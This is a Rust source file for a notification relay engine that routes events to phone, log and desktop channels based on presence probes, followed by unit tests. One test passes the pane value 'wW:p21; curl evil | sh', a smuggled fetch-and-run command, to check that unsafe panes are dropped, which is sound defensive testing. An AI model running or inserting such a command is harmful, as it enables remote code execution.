//! The engine: one event in, a delivery plan out, every decision delegated.
//!
//! This module ORCHESTRATES the decision core against the probe seams; it
//! owns no policy of its own. Two properties are load-bearing and pinned by
//! recording probes rather than by outcomes alone:
//!
//! PROBES RUN ONLY WHEN THEIR ANSWER COULD MATTER. The idle probe is an
//! unbounded pipe on a path that must never stall; a caller that already
//! decided the phone leg (narrowing flags, skip, force, an idle override)
//! must not pay for a reading it cannot use. The attention probes are
//! confined to the one band where they can change the verdict, and the
//! one-second viewing sample runs only when the panes already match.
//!
//! CALLER INTENT IS NEVER OVERRIDDEN. Skip beats force ("I already sent it"
//! is more specific than an override), the narrowing flags beat both, and
//! force exempts the event from viewed-pane suppression.

use std::collections::BTreeMap;

use crate::probes::{FocusedPaneProbe, IdleProbe, MoshRateProbe, PhoneMarkerProbe};
use crate::registry::Selection;
use crate::routing::Leg;

/// The idle threshold the bash defaults to when `RELAY_DESK_IDLE_SECS` says
/// nothing: past this the operator counts as away from the desk.
pub const DEFAULT_DESK_IDLE_SECS: u64 = 120;

/// Everything the environment may override, parsed once at the edge.
/// Garbage numeric values read as absent, never as zero.
#[derive(Debug, Default, PartialEq)]
pub struct Overrides {
    pub idle_secs: Option<u64>,
    pub desk_idle_secs: Option<u64>,
    pub skip_phone: bool,
    pub force_phone: bool,
    pub phone_attention: Option<bool>,
    pub moshi_viewing: Option<bool>,
    pub focused_pane: Option<String>,
    pub marker_ttl_secs: Option<u64>,
    pub attention_floor_bytes: Option<u64>,
    pub physical_fresh_secs: Option<u64>,
    /// Set when the variable was PRESENT and non-empty but not a count. The
    /// bash validators reject such a value outright rather than falling back,
    /// and the fallback is what would turn an unknown into a confident
    /// number: a probe reading where the caller overrode it, or a default
    /// threshold where the caller's was garbled.
    pub idle_invalid: bool,
    pub desk_invalid: bool,
    pub ttl_invalid: bool,
    pub fresh_invalid: bool,
}

impl Overrides {
    /// Parse the RELAY_* and PNS_* variables out of an environment map.
    pub fn from_env(vars: &BTreeMap<String, String>) -> Self {
        // A present-but-garbled value is reported alongside the None, so the
        // caller can refuse it rather than fall back to a default.
        let read = |key: &str| match vars.get(key).filter(|raw| !raw.is_empty()) {
            None => (None, false),
            Some(raw) => {
                let parsed = crate::parse_count(raw);
                (parsed, parsed.is_none())
            }
        };
        let count = |key: &str| read(key).0;
        let set = |key: &str| vars.get(key).is_some_and(|raw| !raw.is_empty());
        let forced = |key: &str| match vars.get(key).map(String::as_str) {
            Some("1") => Some(true),
            Some("0") => Some(false),
            _ => None,
        };
        let (idle_secs, idle_invalid) = read("RELAY_IDLE_SECS");
        let (desk_idle_secs, desk_invalid) = read("RELAY_DESK_IDLE_SECS");
        let (marker_ttl_secs, ttl_invalid) = read("PNS_PHONE_MARKER_TTL");
        let (physical_fresh_secs, fresh_invalid) = read("PNS_PHYSICAL_FRESH_SECS");
        Self {
            idle_secs,
            desk_idle_secs,
            skip_phone: set("RELAY_SKIP_PHONE"),
            force_phone: set("RELAY_FORCE_PHONE"),
            phone_attention: forced("RELAY_PHONE_ATTENTION"),
            moshi_viewing: forced("RELAY_MOSHI_VIEWING"),
            focused_pane: vars
                .get("RELAY_HERDR_FOCUSED_PANE")
                .filter(|pane| !pane.is_empty())
                .cloned(),
            marker_ttl_secs,
            // The floor alone keeps the plain fallback: bash reads it with
            // the same `${VAR:-100}` and never validates it separately.
            attention_floor_bytes: count("PNS_ATTENTION_FLOOR_BYTES"),
            physical_fresh_secs,
            idle_invalid,
            desk_invalid,
            ttl_invalid,
            fresh_invalid,
        }
    }
}

/// What the engine decided for one event.
#[derive(Debug, PartialEq)]
pub struct Decision {
    /// The legs to dispatch, in delivery order.
    pub legs: Vec<Leg>,
    /// The pane was dropped from the event because it failed the safety
    /// check; the caller prints the one warning.
    pub pane_dropped: bool,
}

/// Decide the plan for one event. `now_secs` is the wall clock, taken once
/// at the edge; `None` reads as an unreadable clock and fails the marker
/// check closed.
pub fn decide<P>(
    probes: &P,
    selection: &Selection,
    overrides: &Overrides,
    local_only: bool,
    remote_only: bool,
    pane: &str,
    now_secs: Option<u64>,
) -> Decision
where
    P: IdleProbe + PhoneMarkerProbe + MoshRateProbe + FocusedPaneProbe,
{
    use crate::presence::{
        DEFAULT_ATTENTION_FLOOR_BYTES, DEFAULT_PHONE_MARKER_TTL_SECS, DEFAULT_PHYSICAL_FRESH_SECS,
        attention_band, marker_fresh, mosh_rate_active, moshi_viewing, phone_attention,
    };

    // A garbled threshold is UNKNOWN, never the default: substituting 120
    // would read an at-desk idle as suppressing a push the bash sends.
    let desk_idle_secs = if overrides.desk_invalid {
        None
    } else {
        Some(overrides.desk_idle_secs.unwrap_or(DEFAULT_DESK_IDLE_SECS))
    };

    // No selected leg is presence-gated, so the phone verdict cannot change
    // the plan and no presence reading may be paid for.
    let mut want_phone = false;
    if selection.iter().any(|entry| entry.routing.presence_gated) {
        let decided_without_a_reading = local_only
            || remote_only
            || overrides.skip_phone
            || overrides.force_phone
            || overrides.idle_invalid;
        let idle_secs = match overrides.idle_secs {
            Some(secs) => Some(secs),
            None if decided_without_a_reading => None,
            None => probes.idle_secs(),
        };

        // Skip beats force, so it gates the whole verdict rather than riding
        // in as another argument.
        want_phone = !overrides.skip_phone
            && crate::routing::wants_phone(
                idle_secs,
                desk_idle_secs,
                local_only,
                remote_only,
                overrides.force_phone,
            );

        // Each reading is guarded by the verdict that would discard it, so a
        // forced answer never pays for the probe underneath it.
        let viewing_now = || {
            let rate_active = overrides.moshi_viewing.is_none()
                && probes.sample_csv().is_some_and(|csv| {
                    mosh_rate_active(
                        &csv,
                        overrides
                            .attention_floor_bytes
                            .unwrap_or(DEFAULT_ATTENTION_FLOOR_BYTES),
                    )
                });
            moshi_viewing(overrides.moshi_viewing, rate_active)
        };

        if !want_phone
            && !local_only
            && !remote_only
            && !overrides.skip_phone
            && attention_band(
                idle_secs,
                desk_idle_secs,
                if overrides.fresh_invalid {
                    None
                } else {
                    Some(
                        overrides
                            .physical_fresh_secs
                            .unwrap_or(DEFAULT_PHYSICAL_FRESH_SECS),
                    )
                },
            )
        {
            let marker_is_fresh = overrides.phone_attention.is_none()
                && marker_fresh(
                    probes.marker_mtime_secs(),
                    now_secs,
                    if overrides.ttl_invalid {
                        None
                    } else {
                        Some(
                            overrides
                                .marker_ttl_secs
                                .unwrap_or(DEFAULT_PHONE_MARKER_TTL_SECS),
                        )
                    },
                );
            // The marker is a stat of one file; the sample is a full second
            // of live counters, so it runs only once the marker said nothing.
            let viewing = overrides.phone_attention.is_none() && !marker_is_fresh && viewing_now();
            want_phone = phone_attention(overrides.phone_attention, marker_is_fresh, viewing);
        }

        if want_phone && !overrides.force_phone && !pane.is_empty() {
            let focused = match &overrides.focused_pane {
                Some(pane) => Some(pane.clone()),
                None => probes.focused_pane(),
            };
            if crate::routing::viewed_pane_redundant(pane, &focused.unwrap_or_default())
                && viewing_now()
            {
                want_phone = false;
            }
        }
    }

    Decision {
        legs: crate::routing::channel_plan(selection, local_only, remote_only, want_phone),
        pane_dropped: !pane.is_empty() && !crate::safety::pane_is_safe(pane),
    }
}

/// Which plugins run, given what loading the config found. The composition
/// policy in one place:
///
/// A LOADED config is authoritative. A MISSING config selects every built-in,
/// so the cutover from the bash engine changes nothing until an operator
/// opts in by writing one. A BROKEN config (unreadable, malformed, invalid,
/// or naming an unknown plugin) is LOUD, the returned warning, but still
/// selects every built-in: on an always-exit-0 notification path, a config
/// error that silently turned every notification off would be the exact
/// failure the config layer exists to refuse.
pub fn select_plugins(
    registry: &crate::registry::Registry,
    loaded: Result<crate::config::LoadOutcome, crate::config::ConfigError>,
    mode_plugins: &[&str],
) -> (Selection, Option<String>) {
    // mode_plugins are names the composition root serves OUTSIDE the event
    // plan (hue's pulse today): their config tables are legitimate, so they
    // are stripped before the unknown-name refusal rather than read as
    // typos that would discard the operator's whole selection.
    use crate::config::{ConfigError, LoadOutcome};
    use crate::registry::RegistryError;

    match loaded {
        Ok(LoadOutcome::Loaded(mut config)) => {
            // A REGISTERED name is never stripped: stripping one the roster
            // owns would silently empty the operator's selection instead of
            // honoring it.
            config.plugins.retain(|name, _| {
                !mode_plugins.contains(&name.as_str()) || registry.names().contains(&name.as_str())
            });
            match registry.enabled(&config) {
                Ok(selection) => (selection, None),
                Err(error) => {
                    let detail = match error {
                        RegistryError::UnknownPlugin(name) => format!("unknown plugin `{name}`"),
                        RegistryError::Duplicate(name) => format!("duplicate plugin `{name}`"),
                    };
                    (registry.all(), Some(roster_warning(&detail)))
                }
            }
        }
        Ok(LoadOutcome::Missing) => (registry.all(), None),
        Err(
            ConfigError::Malformed(detail)
            | ConfigError::Invalid(detail)
            | ConfigError::Unreadable(detail),
        ) => (registry.all(), Some(roster_warning(&detail))),
    }
}

/// The one line a broken config prints: what was wrong, and that nothing was
/// turned off because of it.
fn roster_warning(detail: &str) -> String {
    format!("pns: config error ({detail}); running every built-in plugin")
}

/// A path from the environment, defaulting like bash's `${VAR:-default}`:
/// EMPTY means the default as much as unset does, because joining a filename
/// to an empty path resolves into the current directory and quietly delivers
/// nothing.
pub fn resolve_path(candidate: Option<&str>, default: &str) -> std::path::PathBuf {
    std::path::PathBuf::from(
        candidate
            .filter(|value| !value.is_empty())
            .unwrap_or(default),
    )
}

#[cfg(test)]
mod tests {
    use super::{Decision, Overrides, decide};
    use crate::config::parse_config;
    use crate::probes::{FocusedPaneProbe, IdleProbe, MoshRateProbe, PhoneMarkerProbe};
    use crate::registry::{Registry, Routing, Selection};
    use std::cell::Cell;
    use std::collections::BTreeMap;

    /// Recording probes: every reading is counted, so a test can pin that a
    /// probe was never consulted, not only what the verdict was.
    #[derive(Default)]
    struct CountingProbes {
        idle: Option<u64>,
        marker_mtime: Option<u64>,
        sample: Option<String>,
        focused: Option<String>,
        idle_reads: Cell<u32>,
        marker_reads: Cell<u32>,
        sample_reads: Cell<u32>,
        focused_reads: Cell<u32>,
    }

    impl IdleProbe for CountingProbes {
        fn idle_secs(&self) -> Option<u64> {
            self.idle_reads.set(self.idle_reads.get() + 1);
            self.idle
        }
    }
    impl PhoneMarkerProbe for CountingProbes {
        fn marker_mtime_secs(&self) -> Option<u64> {
            self.marker_reads.set(self.marker_reads.get() + 1);
            self.marker_mtime
        }
    }
    impl MoshRateProbe for CountingProbes {
        fn sample_csv(&self) -> Option<String> {
            self.sample_reads.set(self.sample_reads.get() + 1);
            self.sample.clone()
        }
    }
    impl FocusedPaneProbe for CountingProbes {
        fn focused_pane(&self) -> Option<String> {
            self.focused_reads.set(self.focused_reads.get() + 1);
            self.focused.clone()
        }
    }

    fn three_selection() -> Selection {
        let mut registry = Registry::new();
        registry
            .register(
                "moshi",
                Routing {
                    local: false,
                    presence_gated: true,
                    durable: false,
                },
            )
            .unwrap();
        registry
            .register(
                "hermes",
                Routing {
                    local: false,
                    presence_gated: false,
                    durable: true,
                },
            )
            .unwrap();
        registry
            .register(
                "macos-banner",
                Routing {
                    local: true,
                    presence_gated: false,
                    durable: false,
                },
            )
            .unwrap();
        registry
            .enabled(
                &parse_config(
                    "[plugins.moshi]\nenabled = true\n[plugins.hermes]\nenabled = true\n[plugins.macos-banner]\nenabled = true\n",
                )
                .unwrap(),
            )
            .unwrap()
    }

    fn names(decision: &Decision) -> Vec<&str> {
        decision.legs.iter().map(|leg| leg.name).collect()
    }

    // --- caller intent ------------------------------------------------------

    #[test]
    fn skip_phone_beats_force_phone_because_already_sent_is_more_specific() {
        let probes = CountingProbes::default();
        let overrides = Overrides {
            skip_phone: true,
            force_phone: true,
            ..Overrides::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &overrides,
            false,
            false,
            "",
            Some(1_000_000),
        );
        assert_eq!(names(&decision), vec!["hermes", "macos-banner"]);
    }

    #[test]
    fn a_decided_phone_leg_never_pays_for_the_idle_probe() {
        // Force, skip, and an idle override each decide the verdict without
        // the reading; the probe is an unbounded pipe on a path that must
        // never stall for an answer it cannot use.
        for overrides in [
            Overrides {
                force_phone: true,
                ..Overrides::default()
            },
            Overrides {
                skip_phone: true,
                ..Overrides::default()
            },
            Overrides {
                idle_secs: Some(99_999),
                ..Overrides::default()
            },
        ] {
            let probes = CountingProbes::default();
            decide(
                &probes,
                &three_selection(),
                &overrides,
                false,
                false,
                "",
                Some(1_000_000),
            );
            assert_eq!(probes.idle_reads.get(), 0, "overrides: {overrides:?}");
        }
    }

    #[test]
    fn a_narrowing_flag_skips_the_idle_probe_too() {
        for (local, remote) in [(true, false), (false, true)] {
            let probes = CountingProbes::default();
            decide(
                &probes,
                &three_selection(),
                &Overrides::default(),
                local,
                remote,
                "",
                Some(1_000_000),
            );
            assert_eq!(probes.idle_reads.get(), 0);
        }
    }

    // --- the attention override ---------------------------------------------

    #[test]
    fn in_the_band_a_fresh_marker_flips_the_desk_verdict_to_away() {
        // Idle 60 with desk 120 reads "at the desk"; the Back Tap marker
        // touched 10 seconds ago proves the phone is in hand, so the phone
        // leg fires anyway.
        let probes = CountingProbes {
            idle: Some(60),
            marker_mtime: Some(999_990),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "",
            Some(1_000_000),
        );
        assert_eq!(names(&decision), vec!["moshi", "hermes", "macos-banner"]);
        // The marker alone decided; the one-second sample must not also run.
        assert_eq!(probes.sample_reads.get(), 0);
    }

    #[test]
    fn below_the_band_the_attention_probes_are_never_consulted() {
        // A keypress 5 seconds ago proves where the hands are; no marker or
        // byte-rate reading may overrule it, so neither is taken.
        let probes = CountingProbes {
            idle: Some(5),
            marker_mtime: Some(999_999),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "",
            Some(1_000_000),
        );
        assert_eq!(names(&decision), vec!["hermes", "macos-banner"]);
        assert_eq!(probes.marker_reads.get(), 0);
        assert_eq!(probes.sample_reads.get(), 0);
    }

    #[test]
    fn an_unreadable_clock_fails_the_marker_check_closed_but_never_the_push_itself() {
        // now_secs None: the marker cannot be judged fresh, so no attention
        // override fires; the ordinary away rule still pushes on its own.
        let probes = CountingProbes {
            idle: Some(60),
            marker_mtime: Some(999_990),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "",
            None,
        );
        assert_eq!(names(&decision), vec!["hermes", "macos-banner"]);
    }

    // --- viewed-pane suppression --------------------------------------------

    #[test]
    fn the_watched_pane_suppresses_only_the_phone_leg() {
        let probes = CountingProbes {
            idle: Some(900),
            focused: Some("wW:p21".to_string()),
            ..CountingProbes::default()
        };
        let overrides = Overrides {
            moshi_viewing: Some(true),
            ..Overrides::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &overrides,
            false,
            false,
            "wW:p21",
            Some(1_000_000),
        );
        assert_eq!(names(&decision), vec!["hermes", "macos-banner"]);
    }

    #[test]
    fn force_phone_exempts_the_event_from_viewed_pane_suppression() {
        let probes = CountingProbes {
            focused: Some("wW:p21".to_string()),
            ..CountingProbes::default()
        };
        let overrides = Overrides {
            force_phone: true,
            moshi_viewing: Some(true),
            ..Overrides::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &overrides,
            false,
            false,
            "wW:p21",
            Some(1_000_000),
        );
        assert!(names(&decision).contains(&"moshi"));
    }

    #[test]
    fn a_different_focused_pane_never_pays_for_the_viewing_sample() {
        // The one-second sample runs only when the panes already match.
        let probes = CountingProbes {
            idle: Some(900),
            focused: Some("wW:p7".to_string()),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "wW:p21",
            Some(1_000_000),
        );
        assert!(names(&decision).contains(&"moshi"));
        assert_eq!(probes.sample_reads.get(), 0);
    }

    // --- pane safety and the event ------------------------------------------

    #[test]
    fn an_unsafe_pane_is_dropped_once_for_every_channel() {
        let probes = CountingProbes {
            idle: Some(900),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "wW:p21; curl evil | sh",
            Some(1_000_000),
        );
        assert!(decision.pane_dropped);
    }

    #[test]
    fn a_safe_pane_is_not_dropped() {
        let probes = CountingProbes {
            idle: Some(900),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "wW:p21",
            Some(1_000_000),
        );
        assert!(!decision.pane_dropped);
    }

    // --- plugin selection at the composition root ---------------------------

    fn three_registry() -> Registry {
        let mut registry = Registry::new();
        registry
            .register(
                "moshi",
                Routing {
                    local: false,
                    presence_gated: true,
                    durable: false,
                },
            )
            .unwrap();
        registry
            .register(
                "hermes",
                Routing {
                    local: false,
                    presence_gated: false,
                    durable: true,
                },
            )
            .unwrap();
        registry
            .register(
                "macos-banner",
                Routing {
                    local: true,
                    presence_gated: false,
                    durable: false,
                },
            )
            .unwrap();
        registry
    }

    fn selection_names(selection: &Selection) -> Vec<&str> {
        selection.iter().map(|r| r.name).collect()
    }

    #[test]
    fn a_missing_config_selects_every_builtin_so_the_cutover_changes_nothing() {
        use crate::config::LoadOutcome;
        let (selection, warning) =
            super::select_plugins(&three_registry(), Ok(LoadOutcome::Missing), &[]);
        assert_eq!(
            selection_names(&selection),
            vec!["moshi", "hermes", "macos-banner"]
        );
        assert_eq!(warning, None);
    }

    #[test]
    fn a_loaded_config_is_authoritative() {
        use crate::config::LoadOutcome;
        let config = parse_config("[plugins.hermes]\nenabled = true\n").unwrap();
        let (selection, warning) =
            super::select_plugins(&three_registry(), Ok(LoadOutcome::Loaded(config)), &[]);
        assert_eq!(selection_names(&selection), vec!["hermes"]);
        assert_eq!(warning, None);
    }

    #[test]
    fn a_broken_config_is_loud_but_never_turns_notifications_off() {
        use crate::config::ConfigError;
        let (selection, warning) = super::select_plugins(
            &three_registry(),
            Err(ConfigError::Malformed(
                "key with no value at line 1".to_string(),
            )),
            &[],
        );
        assert_eq!(
            selection_names(&selection),
            vec!["moshi", "hermes", "macos-banner"]
        );
        let warning = warning.expect("a broken config must be said aloud");
        assert!(warning.contains("key with no value"));
    }

    #[test]
    fn a_config_naming_an_unknown_plugin_is_loud_and_falls_back_to_the_roster() {
        use crate::config::LoadOutcome;
        let config = parse_config("[plugins.mosih]\nenabled = true\n").unwrap();
        let (selection, warning) =
            super::select_plugins(&three_registry(), Ok(LoadOutcome::Loaded(config)), &[]);
        assert_eq!(
            selection_names(&selection),
            vec!["moshi", "hermes", "macos-banner"]
        );
        let warning = warning.expect("the typo'd name must be said aloud");
        assert!(warning.contains("mosih"));
    }

    #[test]
    fn a_mode_plugins_table_is_not_a_typo_and_the_selection_survives() {
        // The pulse mode REQUIRES a plugins.hue table, so an operator who
        // configures it must not lose their event selection to the
        // unknown-name refusal on every notification.
        use crate::config::LoadOutcome;
        let config =
            parse_config("[plugins.hermes]\nenabled = true\n[plugins.hue]\nenabled = true\n")
                .unwrap();
        let (selection, warning) =
            super::select_plugins(&three_registry(), Ok(LoadOutcome::Loaded(config)), &["hue"]);
        assert_eq!(selection_names(&selection), vec!["hermes"]);
        assert_eq!(warning, None);
    }

    #[test]
    fn a_registered_name_is_never_stripped_even_when_declared_a_mode() {
        // A name that IS an event leg must keep its table: stripping it would
        // silently empty the operator's selection with no warning at all.
        use crate::config::LoadOutcome;
        let config = parse_config("[plugins.hermes]\nenabled = true\n").unwrap();
        let (selection, warning) = super::select_plugins(
            &three_registry(),
            Ok(LoadOutcome::Loaded(config)),
            &["hermes"],
        );
        assert_eq!(selection_names(&selection), vec!["hermes"]);
        assert_eq!(warning, None);
    }

    #[test]
    fn a_true_typo_is_still_refused_even_with_mode_plugins_declared() {
        use crate::config::LoadOutcome;
        let config = parse_config("[plugins.mosih]\nenabled = true\n").unwrap();
        let (_, warning) =
            super::select_plugins(&three_registry(), Ok(LoadOutcome::Loaded(config)), &["hue"]);
        assert!(
            warning
                .expect("the typo is still the defect")
                .contains("mosih")
        );
    }

    // --- overrides parsing --------------------------------------------------

    #[test]
    fn a_garbage_idle_override_is_unknown_without_a_probe_read() {
        // Bash keeps a non-empty override and never runs the probe; the
        // garbled value then fails open in wants_phone. Falling back to the
        // probe would both pay the read and let a live reading suppress the
        // push the unknown should have sent.
        let vars = BTreeMap::from([("RELAY_IDLE_SECS".to_string(), "not-a-number".to_string())]);
        let overrides = Overrides::from_env(&vars);
        let probes = CountingProbes {
            idle: Some(5),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &overrides,
            false,
            false,
            "",
            Some(1_000_000),
        );
        assert_eq!(probes.idle_reads.get(), 0);
        assert!(names(&decision).contains(&"moshi"), "unknown fails open");
    }

    #[test]
    fn a_garbage_desk_threshold_fails_open_never_into_the_default() {
        // Bash rejects the garbled threshold and sends the push; substituting
        // the 120 default would instead read idle 60 as "at the desk" and
        // suppress it.
        let vars = BTreeMap::from([
            ("RELAY_IDLE_SECS".to_string(), "60".to_string()),
            ("RELAY_DESK_IDLE_SECS".to_string(), "garbage".to_string()),
        ]);
        let overrides = Overrides::from_env(&vars);
        let probes = CountingProbes::default();
        let decision = decide(
            &probes,
            &three_selection(),
            &overrides,
            false,
            false,
            "",
            Some(1_000_000),
        );
        assert!(names(&decision).contains(&"moshi"), "unknown fails open");
    }

    #[test]
    fn a_selection_with_no_gated_leg_pays_for_no_presence_reading_at_all() {
        // A hermes-only config makes the phone verdict unable to change the
        // plan, so no probe may run: the one-second sample on every log-only
        // event would be the exact cost the laziness header forbids.
        let mut registry = Registry::new();
        registry
            .register(
                "hermes",
                Routing {
                    local: false,
                    presence_gated: false,
                    durable: true,
                },
            )
            .unwrap();
        let selection = registry
            .enabled(&parse_config("[plugins.hermes]\nenabled = true\n").unwrap())
            .unwrap();
        let probes = CountingProbes {
            idle: Some(60),
            marker_mtime: Some(999_990),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &selection,
            &Overrides::default(),
            false,
            false,
            "wW:p21",
            Some(1_000_000),
        );
        assert_eq!(names(&decision), vec!["hermes"]);
        assert_eq!(probes.idle_reads.get(), 0);
        assert_eq!(probes.marker_reads.get(), 0);
        assert_eq!(probes.sample_reads.get(), 0);
        assert_eq!(probes.focused_reads.get(), 0);
    }

    #[test]
    fn an_empty_channels_dir_variable_means_the_default_not_the_current_dir() {
        // Bash's ${VAR:-default} defaults on EMPTY as well as unset; joining
        // a filename to an empty path would quietly deliver nothing.
        assert_eq!(
            super::resolve_path(Some(""), "/fallback/channels"),
            std::path::PathBuf::from("/fallback/channels")
        );
        assert_eq!(
            super::resolve_path(None, "/fallback/channels"),
            std::path::PathBuf::from("/fallback/channels")
        );
        assert_eq!(
            super::resolve_path(Some("/set/dir"), "/fallback/channels"),
            std::path::PathBuf::from("/set/dir")
        );
    }

    #[test]
    fn skip_and_force_parse_from_their_relay_variables() {
        let vars = BTreeMap::from([
            ("RELAY_SKIP_PHONE".to_string(), "1".to_string()),
            ("RELAY_FORCE_PHONE".to_string(), "1".to_string()),
        ]);
        let overrides = Overrides::from_env(&vars);
        assert!(overrides.skip_phone);
        assert!(overrides.force_phone);
    }
}
